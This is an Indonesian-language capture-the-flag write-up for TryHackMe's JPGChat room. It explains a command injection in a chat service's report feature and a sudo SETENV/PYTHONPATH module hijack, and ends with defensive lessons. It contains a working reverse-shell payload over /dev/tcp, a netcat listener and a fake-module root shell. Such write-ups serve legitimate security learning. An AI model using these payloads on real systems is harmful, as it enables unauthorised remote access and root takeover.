# 🔍 Write-up: JPGChat (TryHackMe)

## 📌 Informasi Umum

- **Nama Challenge**: JPGChat  
- **Platform**: TryHackMe  
- **Kategori**: Binary Exploitation / Privilege Escalation  
- **Port Terbuka**: 3000 (Custom Chat Service)  
- **Tujuan**:  
  1. Dapatkan akses user melalui eksploitasi layanan chat  
  2. Eskalasi hak istimewa ke root  

---

### Nmap Scan
```bash
nmap -sV -p 3000 <TARGET_IP>
```
Port 3000 terbuka, menjalankan layanan TCP bernama JPChat.  

```bash
nc <TARGET_IP> 3000
```
Welcome to JPChat  
the source code of this service can be found at our admin's github  
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel  
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)  
  
Fitur:  
  
[MESSAGE]: kirim pesan ke channel  
[REPORT]: laporkan pengguna, dibaca oleh Mozzie-jpg  

### Cek github Mozzie-jpg untuk melihat source code  

```python
#!/usr/bin/env python3
import os

def report_form():
    print('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```
⚠️ Kerentanan: Input your_name dan report_text langsung dimasukkan ke os.system() tanpa sanitasi → command injection.  

Payload Reverse Shell = $(bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1)  
Jangan lupa pasang listener di terminal sebelum menjalankan program  
```bash
nc -nvlp 4444
```

Kirim payload via [REPORT]  
```bash
nc <TARGET_IP> 3000
[REPORT]
your name:
$(bash -i >& /dev/tcp/10.80.143.242/4444 0>&1)
your report:
test
```
✅ Hasil: Mendapatkan reverse shell sebagai user wes.  
### User flag ada di direktori /home/wes/  

Setelah itu periksa kemampuan sudo untuk privilege esc  
```bash
sudo -l
```
output: User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py  
→ Bisa menjalankan skrip Python tertentu sebagai root, dengan variabel lingkungan yang bisa dikontrol (SETENV).  

### Anaalisis skrip target  
```bash
cat /opt/development/test_module.py
```

isi:  
```python
#!/usr/bin/env python3
from compare import *
print(compare.Str('hello', 'hello', 'hello'))
```
Strategi  
Karena:  
  
Python mencari modul compare di sys.path  
PYTHONPATH bisa diatur (karena SETENV)  
Skrip dijalankan sebagai root  
→ Buat modul compare.py palsu yang mengeksekusi root shell.  
  
Membuat Modul Palsu  
```bash
mkdir /tmp/exp
echo 'import os; os.execl("/bin/bash", "bash")' > /tmp/exp/compare.py
```

Jalankan Exploitasi:  
```bash
sudo PYTHONPATH=/tmp/exp /usr/bin/python3 /opt/development/test_module.py
```

### Flag Root ada di direktori root  

Hikmah (lol)
Jangan gunakan os.system() dengan input user  
→ Gunakan subprocess.run() dengan shell=False dan argumen terpisah.  
Hindari SETENV di konfigurasi sudoers untuk skrip interpreter  
→ Memungkinkan penyerang mengontrol lingkungan eksekusi (misal: PYTHONPATH, LD_PRELOAD).  
Python sangat rentan terhadap path hijacking  
→ Jika penyerang bisa mengontrol sys.path, mereka bisa mengganti modul apa pun.  
Selalu batasi izin sudo  
→ Gunakan env_reset dan larang variabel berbahaya.  

















